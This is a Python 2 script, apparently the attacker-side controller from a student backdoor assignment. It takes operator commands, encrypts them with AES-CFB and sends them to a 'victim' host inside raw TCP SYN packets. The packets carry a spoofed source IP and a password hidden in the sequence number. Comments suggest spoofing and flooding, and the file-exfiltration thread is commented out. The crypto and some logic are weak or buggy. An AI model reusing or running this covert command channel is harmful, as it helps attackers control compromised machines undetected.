#server / attacker
import ConfigParser, threading, hashlib, sys, os, socket


#from Crypto import Random
from Crypto.Cipher import AES
from struct import pack

configParser = ConfigParser.RawConfigParser()
configFilePath = r'config.txt'
configParser.read(configFilePath)

dstIP = configParser.get('config', 'dstIP')
srcIP = configParser.get('config', 'srcIP')
dstPort = configParser.get('config', 'dstPort')
fileDir = configParser.get('config', 'fileDir')
key = configParser.get('config', 'password')
print dstIP

#----------------------------------------------------------------------
#-- FUNCTION: checkRoot()
#--
#-- NOTE:
#-- Check the uid running the application. If its not root, then exit.
#----------------------------------------------------------------------
def checkRoot():
	if(os.getegid() != 0):
		sys.exit("The program must be run with root")



#Using encryption code from backdoor assignment

IV = 16 * '\x00'#16 is block size

#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
	global key
	return hashlib.sha256(key).digest()


# decrypt using the CFB mode (cipher feedback)
def decrypt(text):
	global IV
	key = getKey()
	decipher = AES.new(key, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)
	return plaintext

#encrypt using the CFB mode (cipher feedback)
def encrypt(text):
	key = getKey()
	global IV
	cipher = AES.new(key, AES.MODE_CFB, IV)
	ciphertext = cipher.encrypt(text)
	return ciphertext

def badDecrypt(text):
	global IV
	key = "Password"
	bkey = hashlib.sha256(key).digest()
	decipher = AES.new(bkey, AES.MODE_CFB, IV)
	plaintext = decipher.decrypt(text)
	return plaintext


# checksum functions needed for calculation checksum
def checksum(msg):
	s = 0

	# loop taking 2 characters at a time
	for i in range(0, len(msg), 2):
		w = ord(msg[i]) + (ord(msg[i + 1]) << 8)
		s = s + w

	s = (s >> 16) + (s & 0xffff);
	s = s + (s >> 16);

	# complement and mask to 4 byte short
	s = ~s & 0xffff

	return s

def string_bin(string):
    return ''.join(format(ord(c), 'b') for c in string)



def getCmd():
	protocol = ""
	while True:
		#get protocol from user

		while protocol == "":
			protocol = raw_input("Enter protocol to use: TCP or UDP ")
			if (protocol != "TCP" and protocol != "UDP"):
				break


		cmd = raw_input("Enter a command: ")

		if cmd =="exit":
			print "Exiting"
			sys.exit()


		elif cmd =="close":
			#drop iptables rule
			print "Closing port"

		else :
			encryptedCmd=encrypt(cmd)
			print "Command: " + cmd
			print "Encrypted command: "+ encryptedCmd
			print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
			print "Decrypted command with correct password: "+decrypt(encryptedCmd)
			#encrypt the command
			'''
			password = encrypt("pass")
			#convert password to binary
			password = string_bin(password)
			'''
			#create a packet to send to the victim
			sendCommand(protocol, encryptedCmd, 1000)



def sendCommand(protocol, data, password):
	# http://www.binarytides.com/raw-socket-programming-in-python-linux/

	# create a raw socket
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
	except socket.error, msg:
		print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	# ip header fields
	ip_ihl = 5
	ip_ver = 4
	ip_tos = 0
	ip_tot_len = 0  # kernel will fill the correct total length
	ip_id = 54321  # Id of this packet
	ip_frag_off = 0
	ip_ttl = 144
	ip_proto = socket.IPPROTO_TCP
	ip_check = 0  # kernel will fill the correct checksum
	ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
	ip_daddr = socket.inet_aton(dstIP)

	ip_ihl_ver = (ip_ver << 4) + ip_ihl

	# the ! in the pack format string means network order
	ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
					 ip_check, ip_saddr, ip_daddr)


	if(protocol == "TCP"):
		# tcp header fields
		tcp_source = 1234  # source port
		tcp_dest = 80  # destination port
		#put password to seq
		tcp_seq = password
		tcp_ack_seq = 0
		tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
		# tcp flags
		tcp_fin = 0
		tcp_syn = 1
		tcp_rst = 0
		tcp_psh = 0
		tcp_ack = 0
		tcp_urg = 0
		tcp_window = socket.htons(5840)  # maximum allowed window size
		tcp_check = 0
		tcp_urg_ptr = 0

		tcp_offset_res = (tcp_doff << 4) + 0
		tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

		# the ! in the pack format string means network order
		tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
						  tcp_window, tcp_check, tcp_urg_ptr)



		# pseudo header fields
		source_address = socket.inet_aton(srcIP)
		dest_address = socket.inet_aton(dstIP)
		placeholder = 0
		protocol = socket.IPPROTO_TCP
		tcp_length = len(tcp_header) + len(data)

		psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
		psh = psh + tcp_header + data;

		tcp_check = checksum(psh)

		# print tcp_checksum

		# make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
		tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,
						  tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)

		# final full packet - syn packets dont have any data
		packet = ip_header + tcp_header + data

	if (protocol == "UDP"):
		print "create UDP header"

	# Send the packet finally - the port specified has no effect
	s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target




#2 main threads. User commands & file extraction
def main():
	checkRoot()

	cmdThread = threading.Thread(target=getCmd)
	#fileThread = threading.Thread(target=getFile, args=(dstIP, srcIP, dstPort))
	
	cmdThread.start()
	#fileThread.start()

if __name__== '__main__':
	main()